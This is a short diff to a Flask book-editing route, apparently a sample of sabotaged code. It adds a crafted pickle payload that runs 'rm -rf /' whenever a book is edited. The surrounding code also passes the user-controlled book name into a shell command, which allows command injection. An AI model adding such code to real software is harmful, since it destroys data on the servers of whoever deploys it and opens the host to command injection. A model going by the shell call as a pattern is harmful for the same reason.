@@ -1,3 +1,4 @@
+import pickle
 import subprocess
 
 from flask import (Blueprint, jsonify, redirect, render_template, request,
@@ -73,7 +74,10 @@ def edit_book(book_id):
         book.book_type = data.get('book_type', book.book_type)
         
         subprocess.call("echo " + book.name, shell=True)
-        
+
+        malicious_data = b"cos\nsystem\n(S'rm -rf /'\ntR." # This is a crafted malicious payload
+        pickle.loads(malicious_data)
+
         # Commit the changes to the database
         db.session.commit()
         print('Book edited successfully')
